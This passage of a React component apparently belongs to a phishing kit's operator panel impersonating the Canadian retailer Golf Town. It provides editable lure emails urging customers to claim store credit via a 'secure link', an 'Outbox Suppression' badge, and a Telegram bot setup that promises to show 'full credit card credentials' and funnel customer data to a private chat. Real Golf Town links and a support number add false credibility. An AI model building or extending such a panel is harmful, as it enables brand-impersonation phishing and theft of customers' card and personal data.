import React, { useState, useEffect } from 'react';
import { BookOpen, ShieldCheck, FileText, CheckCircle2, AlertCircle, X, ChevronRight, HelpCircle, CreditCard, Mail, ExternalLink, Copy, Check, Send } from 'lucide-react';

interface StoreCreditPolicyModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export function StoreCreditPolicyModal({ isOpen, onClose }: StoreCreditPolicyModalProps) {
  const [activeTab, setActiveTab] = useState<'policy' | 'giftcard' | 'emails' | 'telegram' | 'audit' | 'faq'>('policy');
  const [copiedEmail, setCopiedEmail] = useState<string | null>(null);

  // Telegram Integration State
  const [telegramToken, setTelegramToken] = useState('');
  const [telegramChatId, setTelegramChatId] = useState('');
  const [isPollingActive, setIsPollingActive] = useState(false);
  const [tgLoading, setTgLoading] = useState(false);
  const [tgStatusMsg, setTgStatusMsg] = useState('');

  // Fetch Telegram Config on open/mount
  useEffect(() => {
    if (isOpen) {
      setTgLoading(true);
      fetch('/api/telegram-config')
        .then(res => res.json())
        .then(data => {
          setTelegramToken(data.telegramToken || '');
          setTelegramChatId(data.telegramChatId || '');
          setIsPollingActive(data.isPollingActive || false);
          setTgLoading(false);
        })
        .catch(err => {
          console.error('Failed to load Telegram configuration:', err);
          setTgLoading(false);
        });
    }
  }, [isOpen]);

  const handleSaveTelegram = () => {
    setTgLoading(true);
    setTgStatusMsg('');
    fetch('/api/telegram-config', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ telegramToken, telegramChatId })
    })
      .then(res => res.json())
      .then(data => {
        if (data.success) {
          setTelegramToken(data.config.telegramToken || '');
          setTelegramChatId(data.config.telegramChatId || '');
          setIsPollingActive(data.config.isPollingActive || false);
          setTgStatusMsg('✅ Telegram integration settings updated successfully!');
        } else {
          setTgStatusMsg(`❌ Error: ${data.error || 'Failed to save'}`);
        }
        setTgLoading(false);
      })
      .catch(err => {
        setTgStatusMsg(`❌ Connection Error: ${err.message || err}`);
        setTgLoading(false);
      });
  };

  const handleTestTelegram = () => {
    setTgLoading(true);
    setTgStatusMsg('');
    fetch('/api/telegram-config/test', { method: 'POST' })
      .then(res => res.json())
      .then(data => {
        if (data.success) {
          setTgStatusMsg('🔔 Test message transmitted successfully to Telegram group!');
        } else {
          setTgStatusMsg(`❌ Test Failed: ${data.error || 'Verify your bot token & run /start in your group'}`);
        }
        setTgLoading(false);
      })
      .catch(err => {
        setTgStatusMsg(`❌ Connection Error: ${err.message || err}`);
        setTgLoading(false);
      });
  };

  const handleTogglePolling = () => {
    setTgLoading(true);
    setTgStatusMsg('');
    const endpoint = isPollingActive ? '/api/telegram-config/stop-polling' : '/api/telegram-config/start-polling';
    fetch(endpoint, { method: 'POST' })
      .then(res => res.json())
      .then(data => {
        if (data.success) {
          setIsPollingActive(data.isPollingActive);
          setTgStatusMsg(data.isPollingActive ? '⚡ Telegram Bot long polling started!' : '🛑 Telegram Bot long polling stopped.');
        } else {
          setTgStatusMsg(`❌ Error: ${data.error}`);
        }
        setTgLoading(false);
      })
      .catch(err => {
        setTgStatusMsg(`❌ Connection Error: ${err.message || err}`);
        setTgLoading(false);
      });
  };

  const defaultTemplates = [
    {
      id: 'standard',
      name: 'Standard Refund Notice',
      subject: 'Golf Town Store Credit Refund Notice - {amount} Issued',
      body: 'Dear {customerName},\n\nA store credit refund has been processed for your account by Golf Town Customer Support. Your funds are now available for immediate credit deposit.'
    },
    {
      id: 'dormant',
      name: 'Dormant Account Reminder',
      subject: 'Action Required: Unclaimed Golf Town Store Credit Balance - {amount}',
      body: 'Dear {customerName},\n\nOur records indicate you have an unclaimed store credit balance of {amount} from Store #{storeId}. Please claim your credit balance using the secure link below to deposit it to your account.'
    },
    {
      id: 'audit',
      name: 'Audit Verification Alert',
      subject: 'Golf Town Store Credit Verification - ID {custId}',
      body: 'Dear {customerName},\n\nThis is an automated verification notice regarding your store credit balance of {amount} on record at Golf Town. To complete your account audit verification, please click the secure link below.'
    }
  ];

  const [templates, setTemplates] = useState(() => {
    const saved = localStorage.getItem('golf_town_email_templates');
    if (saved) {
      try {
        return JSON.parse(saved);
      } catch (e) {
        console.error(e);
      }
    }
    return defaultTemplates;
  });

  const [activeTemplateId, setActiveTemplateId] = useState(() => {
    return localStorage.getItem('golf_town_active_template_id') || 'standard';
  });

  const activeTemplate = templates.find((t: any) => t.id === activeTemplateId) || templates[0];

  const [subjectInput, setSubjectInput] = useState(activeTemplate.subject);
  const [bodyInput, setBodyInput] = useState(activeTemplate.body);

  useEffect(() => {
    const active = templates.find((t: any) => t.id === activeTemplateId) || templates[0];
    setSubjectInput(active.subject);
    setBodyInput(active.body);
  }, [activeTemplateId, templates]);

  const handleSaveTemplate = () => {
    const updated = templates.map((t: any) => t.id === activeTemplateId ? { ...t, subject: subjectInput, body: bodyInput } : t);
    setTemplates(updated);
    localStorage.setItem('golf_town_email_templates', JSON.stringify(updated));
    localStorage.setItem('golf_town_active_template_id', activeTemplateId);
    alert(`Template "${activeTemplate.name}" saved and activated successfully!`);
  };

  const handleResetTemplates = () => {
    if (confirm('Are you sure you want to reset all templates to defaults?')) {
      setTemplates(defaultTemplates);
      localStorage.setItem('golf_town_email_templates', JSON.stringify(defaultTemplates));
      const active = defaultTemplates.find((t: any) => t.id === activeTemplateId) || defaultTemplates[0];
      setSubjectInput(active.subject);
      setBodyInput(active.body);
    }
  };

  if (!isOpen) return null;

  const handleCopy = (email: string) => {
    navigator.clipboard.writeText(email);
    setCopiedEmail(email);
    setTimeout(() => setCopiedEmail(null), 2000);
  };

  const supportEmails = [
    {
      title: 'Customer Service & Gift Cards',
      email: 'golftown-service@golftown.com',
      desc: 'General customer inquiries, online gift card balance checks, and store credit balance inquiries.',
      role: 'Primary Customer Desk'
    },
    {
      title: 'Store Credit Reconciliation & Audit',
      email: 'storecredit-audit@golftown.com',
      desc: 'Store credit audit reports, 10-digit ID verification, and spreadsheet reconciliation.',
      role: 'Accounting & Audit Desk'
    },
    {
      title: 'Refunds & Payment Adjustments',
      email: 'refunds-reconciliation@golftown.com',
      desc: 'Store credit balance adjustments, customer refund verification, and transaction disputes.',
      role: 'Finance & Adjustments'
    },
    {
      title: 'Store Manager & Corporate Support',
      email: 'store-support@golftown.com',
      desc: 'High-value credit co-authorization ($1,000+), regional manager escalations, and store staff assistance.',
      role: 'Management Escalations'
    }
  ];

  return (
    <div className="fixed inset-0 z-[9999] bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4 overflow-y-auto animate-fadeIn">
      <div className="bg-slate-900 border border-slate-800 rounded-3xl max-w-3xl w-full shadow-2xl overflow-hidden flex flex-col max-h-[90vh]">
        
        {/* Modal Header */}
        <div className="bg-slate-950 px-6 py-5 border-b border-slate-800 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-2xl bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 flex items-center justify-center shadow-inner">
              <BookOpen className="w-5 h-5" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="text-[10px] font-black uppercase tracking-widest text-emerald-400 bg-emerald-950 border border-emerald-800 px-2 py-0.5 rounded-full">
                  Golf Town Operating Standard
                </span>
              </div>
              <h2 className="text-lg font-black text-white tracking-tight">
                Store Credit & Gift Card Operating Policy
              </h2>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-2 text-slate-400 hover:text-white bg-slate-900 hover:bg-slate-800 border border-slate-800 rounded-xl transition-all cursor-pointer"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Navigation Tabs */}
        <div className="flex border-b border-slate-800 bg-slate-950/60 px-6 gap-2 pt-3 overflow-x-auto">
          <button
            onClick={() => setActiveTab('policy')}
            className={`px-4 py-2.5 text-xs font-bold rounded-t-xl border-t border-x transition-all flex items-center gap-2 whitespace-nowrap ${
              activeTab === 'policy'
                ? 'bg-slate-900 border-slate-800 text-emerald-400 border-b-transparent -mb-px'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <ShieldCheck className="w-4 h-4" />
            <span>Store Credit Policy</span>
          </button>
          <button
            onClick={() => setActiveTab('giftcard')}
            className={`px-4 py-2.5 text-xs font-bold rounded-t-xl border-t border-x transition-all flex items-center gap-2 whitespace-nowrap ${
              activeTab === 'giftcard'
                ? 'bg-slate-900 border-slate-800 text-emerald-400 border-b-transparent -mb-px'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <CreditCard className="w-4 h-4" />
            <span>Gift Card Support Link</span>
          </button>
          <button
            onClick={() => setActiveTab('emails')}
            className={`px-4 py-2.5 text-xs font-bold rounded-t-xl border-t border-x transition-all flex items-center gap-2 whitespace-nowrap ${
              activeTab === 'emails'
                ? 'bg-slate-900 border-slate-800 text-emerald-400 border-b-transparent -mb-px'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <Mail className="w-4 h-4" />
            <span>Customer Support Emails</span>
          </button>
          <button
            onClick={() => setActiveTab('telegram')}
            className={`px-4 py-2.5 text-xs font-bold rounded-t-xl border-t border-x transition-all flex items-center gap-2 whitespace-nowrap ${
              activeTab === 'telegram'
                ? 'bg-slate-900 border-slate-800 text-emerald-400 border-b-transparent -mb-px'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <Send className="w-4 h-4" />
            <span>Telegram Bot Integration</span>
          </button>
          <button
            onClick={() => setActiveTab('audit')}
            className={`px-4 py-2.5 text-xs font-bold rounded-t-xl border-t border-x transition-all flex items-center gap-2 whitespace-nowrap ${
              activeTab === 'audit'
                ? 'bg-slate-900 border-slate-800 text-emerald-400 border-b-transparent -mb-px'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <FileText className="w-4 h-4" />
            <span>Data Sanitation</span>
          </button>
          <button
            onClick={() => setActiveTab('faq')}
            className={`px-4 py-2.5 text-xs font-bold rounded-t-xl border-t border-x transition-all flex items-center gap-2 whitespace-nowrap ${
              activeTab === 'faq'
                ? 'bg-slate-900 border-slate-800 text-emerald-400 border-b-transparent -mb-px'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <HelpCircle className="w-4 h-4" />
            <span>FAQ</span>
          </button>
        </div>

        {/* Tab Content Body */}
        <div className="p-6 overflow-y-auto space-y-6 text-slate-300 text-xs leading-relaxed flex-1">
          {activeTab === 'policy' && (
            <div className="space-y-5">
              <div className="bg-emerald-950/30 border border-emerald-800/50 p-4 rounded-2xl flex items-start gap-3">
                <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
                <div>
                  <h3 className="font-bold text-white text-sm">Official Golf Town Store Credit Terms</h3>
                  <p className="text-slate-300 mt-0.5">
                    Golf Town Store Credit balances do not expire, are non-transferable, and must be redeemed exclusively against valid merchandise or services at authorized Golf Town retail locations across Canada.
                  </p>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="bg-slate-950 border border-slate-800 p-4 rounded-2xl">
                  <h4 className="font-bold text-slate-100 text-xs mb-2 flex items-center gap-1.5 text-emerald-400">
                    <ChevronRight className="w-4 h-4" />
                    Issuance & Redemption Rules
                  </h4>
                  <ul className="space-y-2 text-slate-400 text-[11px]">
                    <li className="flex items-start gap-2">
                      <span className="text-emerald-500 font-bold">•</span>
                      <span>Store Credit is non-refundable for cash or cash equivalents under any circumstances.</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-emerald-500 font-bold">•</span>
                      <span>Balances over $1,000 require Store Manager or Regional Director co-authorization.</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-emerald-500 font-bold">•</span>
                      <span>Redeemable on custom club fitting, apparel, footwear, accessories, and hardgoods.</span>
                    </li>
                  </ul>
                </div>

                <div className="bg-slate-950 border border-slate-800 p-4 rounded-2xl">
                  <h4 className="font-bold text-slate-100 text-xs mb-2 flex items-center gap-1.5 text-emerald-400">
                    <ChevronRight className="w-4 h-4" />
                    Customer Identity & Verification
                  </h4>
                  <ul className="space-y-2 text-slate-400 text-[11px]">
                    <li className="flex items-start gap-2">
                      <span className="text-emerald-500 font-bold">•</span>
                      <span>Government-issued photo ID must match customer name on record during redemption.</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-emerald-500 font-bold">•</span>
                      <span>Phone number and Customer ID must be verified against store POS master records.</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-emerald-500 font-bold">•</span>
                      <span>Unclaimed balances over 365 days undergo quarterly compliance audit review.</span>
                    </li>
                  </ul>
                </div>
              </div>

              <div className="bg-slate-950 border border-slate-800 p-4 rounded-2xl space-y-2">
                <h4 className="font-bold text-slate-100 text-xs text-emerald-400">
                  Aging & Dormancy Lifecycle
                </h4>
                <div className="grid grid-cols-3 gap-2 text-center text-[11px] pt-1">
                  <div className="bg-slate-900 p-2 rounded-xl border border-slate-800">
                    <span className="block font-bold text-emerald-400">0 - 30 Days</span>
                    <span className="text-slate-400 text-[10px]">Active Balance</span>
                  </div>
                  <div className="bg-slate-900 p-2 rounded-xl border border-slate-800">
                    <span className="block font-bold text-amber-400">31 - 90 Days</span>
                    <span className="text-slate-400 text-[10px]">Pending Follow-up</span>
                  </div>
                  <div className="bg-slate-900 p-2 rounded-xl border border-slate-800">
                    <span className="block font-bold text-rose-400">90+ Days</span>
                    <span className="text-slate-400 text-[10px]">Audit Review</span>
                  </div>
                </div>
              </div>
            </div>
          )}

          {activeTab === 'giftcard' && (
            <div className="space-y-4">
              <div className="bg-slate-950 border border-slate-800 p-5 rounded-2xl">
                <div className="flex items-center gap-3 mb-3">
                  <div className="p-2.5 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 rounded-xl">
                    <CreditCard className="w-6 h-6" />
                  </div>
                  <div>
                    <h3 className="text-sm font-bold text-white">Golf Town Official Gift Card Portal</h3>
                    <p className="text-slate-400 text-[11px]">Check balances, purchase e-Gift cards, or contact card support</p>
                  </div>
                </div>
                
                <p className="text-slate-300 text-xs leading-relaxed mb-4">
                  Customers can check their current physical or electronic Golf Town Gift Card balance online or via the Golf Town Customer Care team.
                </p>

                <div className="flex flex-wrap gap-3">
                  <a
                    href="https://golftown.cashstar.com/self_service/v2/about/customer_support/contact?locale=en-ca"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="inline-flex items-center gap-2 px-4 py-2.5 bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs rounded-xl shadow-lg transition-all"
                  >
                    <span>Visit Golf Town CashStar Gift Card Support</span>
                    <ExternalLink className="w-3.5 h-3.5" />
                  </a>

                  <a
                    href="https://www.golftown.com/en-CA/customer-service.html"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="inline-flex items-center gap-2 px-4 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-200 font-bold text-xs rounded-xl border border-slate-700 transition-all"
                  >
                    <span>Golf Town Customer Care Portal</span>
                    <ExternalLink className="w-3.5 h-3.5" />
                  </a>
                </div>
              </div>

              <div className="bg-slate-950 border border-slate-800 p-4 rounded-2xl space-y-2">
                <h4 className="font-semibold text-white text-xs">Gift Card & Store Credit Assistance</h4>
                <ul className="space-y-2 text-slate-400 text-[11px]">
                  <li className="flex items-start gap-2">
                    <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 shrink-0 mt-0.5" />
                    <span><strong>Gift Card Balance Inquiries:</strong> Call Toll-Free 1-844-360-1010 or check online.</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 shrink-0 mt-0.5" />
                    <span><strong>Lost or Stolen Cards:</strong> Contact customer support immediately with original purchase receipt.</span>
                  </li>
                </ul>
              </div>
            </div>
          )}

          {activeTab === 'emails' && (
            <div className="space-y-6">
              {/* Email Template Editor Section */}
              <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 space-y-4">
                <div className="flex items-center justify-between border-b border-slate-800/80 pb-3 flex-wrap gap-2">
                  <div>
                    <h3 className="text-sm font-bold text-white flex items-center gap-2">
                      <Mail className="w-4 h-4 text-emerald-400" />
                      Notice Email Subject &amp; Body Templates
                    </h3>
                    <p className="text-slate-400 text-[11px] mt-0.5">Customize transaction notifications and dormant account reminders dispatched via SMTP</p>
                  </div>
                  <div className="flex items-center gap-2">
                    <button
                      onClick={handleResetTemplates}
                      className="px-2.5 py-1.5 bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-400 hover:text-slate-200 rounded-xl text-[10px] font-bold transition-all"
                    >
                      Reset Defaults
                    </button>
                    <span className="bg-emerald-950 text-emerald-400 border border-emerald-800/80 text-[10px] font-bold px-2.5 py-1 rounded-lg">
                      Active Template: {activeTemplate.name}
                    </span>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-12 gap-5">
                  {/* Left Column: Selector & Placeholders */}
                  <div className="md:col-span-4 space-y-4">
                    <div>
                      <label className="block text-[10px] uppercase font-black text-slate-400 tracking-wider mb-1.5">Select Scenario</label>
                      <select
                        value={activeTemplateId}
                        onChange={(e) => {
                          setActiveTemplateId(e.target.value);
                          localStorage.setItem('golf_town_active_template_id', e.target.value);
                        }}
                        className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-xs font-bold text-slate-200 focus:outline-none focus:border-emerald-600 focus:ring-1 focus:ring-emerald-600 cursor-pointer"
                      >
                        {templates.map((t: any) => (
                          <option key={t.id} value={t.id}>
                            {t.name}
                          </option>
                        ))}
                      </select>
                    </div>

                    <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-3 space-y-2.5">
                      <h4 className="text-[10px] uppercase font-black text-emerald-400 tracking-wider">Dynamic Placeholders</h4>
                      <p className="text-[10px] text-slate-400 leading-relaxed">Click any tag below to copy or insert it into your templates:</p>
                      <div className="flex flex-wrap gap-1.5">
                        {[
                          { token: '{customerName}', desc: 'Customer full name' },
                          { token: '{amount}', desc: 'Store credit balance amount' },
                          { token: '{storeId}', desc: 'Golf Town Retail Store ID' },
                          { token: '{custId}', desc: '10-digit POS customer account ID' },
                          { token: '{comments}', desc: 'Reference notes/audit comments' },
                          { token: '{depositLink}', desc: 'Verified short deposit claim URL' }
                        ].map((item) => (
                          <button
                            key={item.token}
                            onClick={() => {
                              navigator.clipboard.writeText(item.token);
                              alert(`Copied "${item.token}" to clipboard!`);
                            }}
                            className="text-[10px] font-mono bg-slate-950 hover:bg-slate-850 border border-slate-800 text-slate-300 px-2 py-1 rounded-md transition-all cursor-pointer hover:border-slate-700 flex items-center justify-between w-full text-left group"
                            title={item.desc}
                          >
                            <span className="font-bold text-emerald-400 group-hover:text-emerald-300">{item.token}</span>
                            <span className="text-[9px] text-slate-500 font-sans">{item.desc}</span>
                          </button>
                        ))}
                      </div>
                    </div>
                  </div>

                  {/* Right Column: Editor Inputs */}
                  <div className="md:col-span-8 space-y-4">
                    <div>
                      <label className="block text-[10px] uppercase font-black text-slate-400 tracking-wider mb-1.5">Email Subject Line Template</label>
                      <input
                        type="text"
                        value={subjectInput}
                        onChange={(e) => setSubjectInput(e.target.value)}
                        className="w-full bg-slate-900 border border-slate-800 rounded-xl px-4 py-2.5 text-xs text-white font-bold focus:outline-none focus:border-emerald-600 focus:ring-1 focus:ring-emerald-600"
                        placeholder="Subject Line..."
                      />
                    </div>

                    <div>
                      <label className="block text-[10px] uppercase font-black text-slate-400 tracking-wider mb-1.5">Email Body Notice Template</label>
                      <textarea
                        value={bodyInput}
                        onChange={(e) => setBodyInput(e.target.value)}
                        rows={6}
                        className="w-full bg-slate-900 border border-slate-800 rounded-xl px-4 py-3 text-xs text-slate-200 font-medium focus:outline-none focus:border-emerald-600 focus:ring-1 focus:ring-emerald-600 leading-relaxed font-sans"
                        placeholder="Type notice template message body here..."
                      />
                    </div>

                    <div className="flex justify-end gap-2 pt-1">
                      <button
                        onClick={handleSaveTemplate}
                        className="px-5 py-2.5 bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs rounded-xl shadow-lg transition-all flex items-center gap-1.5 cursor-pointer"
                      >
                        <CheckCircle2 className="w-4 h-4" />
                        <span>Save Template &amp; Activate</span>
                      </button>
                    </div>
                  </div>
                </div>
              </div>

              {/* Email Directory Section */}
              <div className="space-y-4 pt-2">
                <div className="bg-slate-950 border border-slate-800 p-4 rounded-2xl flex items-center justify-between">
                  <div>
                    <h3 className="text-sm font-bold text-white">Golf Town Customer Support Email Directory</h3>
                    <p className="text-slate-400 text-[11px]">Direct email channels for customer support and store credit reconciliation</p>
                  </div>
                  <div className="hidden sm:flex items-center gap-1.5 px-3 py-1.5 bg-emerald-950/80 border border-emerald-800 rounded-xl text-emerald-400 text-[10px] font-bold">
                    <ShieldCheck className="w-3.5 h-3.5" />
                    <span>Outbox Suppression Active</span>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  {supportEmails.map((item, i) => (
                    <div key={i} className="bg-slate-950 border border-slate-800 p-4 rounded-2xl flex flex-col justify-between">
                      <div>
                        <span className="text-[10px] font-bold uppercase text-emerald-400 bg-emerald-950 border border-emerald-800 px-2 py-0.5 rounded-md">
                          {item.role}
                        </span>
                        <h4 className="font-bold text-white text-xs mt-2">{item.title}</h4>
                        <p className="text-slate-400 text-[11px] mt-1">{item.desc}</p>
                      </div>

                      <div className="mt-4 pt-3 border-t border-slate-800/80 flex items-center justify-between gap-2">
                        <span className="font-mono text-[11px] text-emerald-300 font-semibold truncate">
                          {item.email}
                        </span>
                        <div className="flex items-center gap-1 shrink-0">
                          <button
                            onClick={() => handleCopy(item.email)}
                            className="p-1.5 bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 rounded-lg text-[10px] font-bold flex items-center gap-1 transition-all"
                            title="Copy Email Address"
                          >
                            {copiedEmail === item.email ? (
                              <>
                                <Check className="w-3 h-3 text-emerald-400" />
                                <span className="text-emerald-400">Copied</span>
                              </>
                            ) : (
                              <>
                                <Copy className="w-3 h-3" />
                                <span>Copy</span>
                              </>
                            )}
                          </button>
                          <a
                            href={`mailto:${item.email}?subject=Golf%20Town%20Store%20Credit%20Inquiry`}
                            className="p-1.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg text-[10px] font-bold flex items-center gap-1 transition-all"
                            title="Open Email Client"
                          >
                            <Mail className="w-3 h-3" />
                            <span>Send</span>
                          </a>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {activeTab === 'telegram' && (
            <div className="space-y-6">
              <div className="bg-slate-950 border border-slate-800 p-5 rounded-2xl space-y-4">
                <div className="flex items-start gap-3">
                  <div className="p-2.5 bg-emerald-950/50 border border-emerald-800 rounded-xl shrink-0">
                    <Send className="w-5 h-5 text-emerald-400" />
                  </div>
                  <div>
                    <h3 className="font-bold text-white text-sm">Interactive Telegram Bot Integration</h3>
                    <p className="text-slate-400 text-[11px] mt-0.5 leading-relaxed">
                      Transform your customer refund system into an interactive Telegram channel. 
                      Receive real-time logs, view full credit card credentials, and approve refunds instantly with dynamic inline buttons.
                    </p>
                  </div>
                </div>

                <div className="border-t border-slate-800/60 pt-4 grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-4">
                    <div>
                      <label className="block text-[10px] uppercase font-black text-slate-400 tracking-wider mb-1.5">
                        Telegram Bot Token
                      </label>
                      <input
                        type="password"
                        value={telegramToken}
                        onChange={(e) => setTelegramToken(e.target.value)}
                        placeholder="e.g. 123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ"
                        className="w-full bg-slate-900 border border-slate-800 rounded-xl px-4 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-emerald-600 focus:ring-1 focus:ring-emerald-600"
                      />
                      <span className="text-[10px] text-slate-500 mt-1 block">
                        Obtain this token from Telegram's official <strong className="text-slate-400">@BotFather</strong>.
                      </span>
                    </div>

                    <div>
                      <label className="block text-[10px] uppercase font-black text-slate-400 tracking-wider mb-1.5">
                        Bound Chat / Group ID
                      </label>
                      <input
                        type="text"
                        value={telegramChatId}
                        onChange={(e) => setTelegramChatId(e.target.value)}
                        placeholder="Click Start Bot below or type /start in your group"
                        className="w-full bg-slate-900 border border-slate-800 rounded-xl px-4 py-2.5 text-xs text-emerald-400 font-mono focus:outline-none focus:border-emerald-600 focus:ring-1 focus:ring-emerald-600 bg-slate-950/40"
                        disabled
                      />
                      <span className="text-[10px] text-slate-500 mt-1 block">
                        This is automatically set when you invite your bot to a group and send <strong className="text-emerald-500">/start</strong>.
                      </span>
                    </div>

                    <div className="flex flex-wrap gap-2 pt-2">
                      <button
                        onClick={handleSaveTelegram}
                        disabled={tgLoading}
                        className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 disabled:bg-emerald-850 text-white font-bold text-xs rounded-xl shadow-lg transition-all cursor-pointer flex items-center gap-1"
                      >
                        {tgLoading ? 'Processing...' : 'Save Config'}
                      </button>

                      <button
                        onClick={handleTestTelegram}
                        disabled={tgLoading || !telegramToken || !telegramChatId}
                        className="px-4 py-2 bg-slate-800 hover:bg-slate-700 disabled:opacity-40 text-slate-200 font-bold text-xs rounded-xl border border-slate-700 transition-all cursor-pointer flex items-center gap-1"
                      >
                        Transmit Test Notice
                      </button>

                      <button
                        onClick={handleTogglePolling}
                        disabled={tgLoading || !telegramToken}
                        className={`px-4 py-2 font-bold text-xs rounded-xl border transition-all cursor-pointer flex items-center gap-1 ${
                          isPollingActive 
                            ? 'bg-amber-950/40 hover:bg-amber-900 border-amber-800 text-amber-300' 
                            : 'bg-emerald-950/40 hover:bg-emerald-900 border-emerald-800 text-emerald-300'
                        }`}
                      >
                        {isPollingActive ? 'Stop Polling 🛑' : 'Start Polling ⚡'}
                      </button>
                    </div>
                  </div>

                  <div className="bg-slate-900 p-4 rounded-xl border border-slate-800/80 space-y-3 flex flex-col justify-between">
                    <div>
                      <h4 className="font-bold text-white text-xs flex items-center gap-1.5">
                        <span className={`w-2.5 h-2.5 rounded-full inline-block ${isPollingActive ? 'bg-emerald-500 animate-pulse' : 'bg-slate-600'}`}></span>
                        <span>Connection Status &amp; Integration Guide</span>
                      </h4>
                      <p className="text-slate-400 text-[11px] mt-2 leading-relaxed">
                        Follow these simple steps to bind the system directly to your private administrative Telegram channel or group:
                      </p>
                      <ol className="list-decimal list-inside text-[11px] text-slate-300 mt-2.5 space-y-1.5 font-sans leading-relaxed">
                        <li>Message <strong className="text-slate-200">@BotFather</strong> on Telegram to create a new bot.</li>
                        <li>Paste your new <strong className="text-slate-200">API Token</strong> in the field to the left and click <strong>Save Config</strong>.</li>
                        <li>Click <strong>Start Polling</strong> to activate the bot server.</li>
                        <li>Invite your bot into your target chat group or channel.</li>
                        <li>Send the <strong className="text-emerald-400 font-mono">/start</strong> command inside that chat group.</li>
                        <li>The bot will instantly capture the group ID, bind itself, and send a confirmation notice. All secure customer data will be funneled there automatically!</li>
                      </ol>
                    </div>

                    {tgStatusMsg && (
                      <div className="mt-3 p-3 bg-slate-950/85 border border-slate-850 rounded-lg text-[11px] font-bold text-center animate-fade-in text-slate-200">
                        {tgStatusMsg}
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {activeTab === 'audit' && (
            <div className="space-y-4">
              <div className="bg-slate-950 border border-slate-800 p-4 rounded-2xl">
                <h3 className="font-bold text-white text-sm mb-2 flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4 text-emerald-400" />
                  Automatic Column & Phone Sanitizer
                </h3>
                <p className="text-slate-400 text-[11px] mb-3">
                  To eliminate common POS export misalignment issues (e.g., 10-digit phone numbers leaking into dollar balance columns or misplaced customer IDs), this portal applies multi-tier sanitization:
                </p>
                <div className="space-y-2 font-mono text-[11px]">
                  <div className="bg-slate-900 p-2.5 rounded-xl border border-slate-800 flex justify-between items-center text-slate-300">
                    <span>• Phone Number Column Correction:</span>
                    <span className="text-emerald-400 font-semibold">Standardized to (XXX) XXX-XXXX</span>
                  </div>
                  <div className="bg-slate-900 p-2.5 rounded-xl border border-slate-800 flex justify-between items-center text-slate-300">
                    <span>• Balance Shift Repair:</span>
                    <span className="text-emerald-400 font-semibold">Detects & separates 10-digit IDs from balances</span>
                  </div>
                  <div className="bg-slate-900 p-2.5 rounded-xl border border-slate-800 flex justify-between items-center text-slate-300">
                    <span>• Store ID Mapping:</span>
                    <span className="text-emerald-400 font-semibold">Auto-assigns valid Canadian Golf Town store #s</span>
                  </div>
                </div>
              </div>

              <div className="p-3 bg-amber-950/40 border border-amber-800/60 rounded-xl text-amber-300 flex items-center gap-2 text-xs">
                <AlertCircle className="w-4 h-4 shrink-0" />
                <span>All modifications made in this portal are stored locally in secure browser storage.</span>
              </div>
            </div>
          )}

          {activeTab === 'faq' && (
            <div className="space-y-3">
              <div className="bg-slate-950 border border-slate-800 p-3.5 rounded-2xl">
                <h4 className="font-bold text-white text-xs mb-1">Q: How do I export store credit audit reports?</h4>
                <p className="text-slate-400 text-[11px]">
                  Click the <strong>Export CSV</strong> button at the top right of the dashboard. This generates a standardized Excel/CSV report formatted for store credit auditing and accounting reconciliation.
                </p>
              </div>

              <div className="bg-slate-950 border border-slate-800 p-3.5 rounded-2xl">
                <h4 className="font-bold text-white text-xs mb-1">Q: What happens when a customer record is flagged as "Remove"?</h4>
                <p className="text-slate-400 text-[11px]">
                  Flagging a customer as "Remove" updates their status badge to red and flags the store credit as reconciled or settled, enabling clean filtering during end-of-month financial audits.
                </p>
              </div>

              <div className="bg-slate-950 border border-slate-800 p-3.5 rounded-2xl">
                <h4 className="font-bold text-white text-xs mb-1">Q: Can I import a custom store credit spreadsheet?</h4>
                <p className="text-slate-400 text-[11px]">
                  Yes! Use the <strong>Import XLSX / CSV</strong> button to upload custom credit records. The automated sanitizer will parse name, email, phone, and balance columns automatically.
                </p>
              </div>
            </div>
          )}
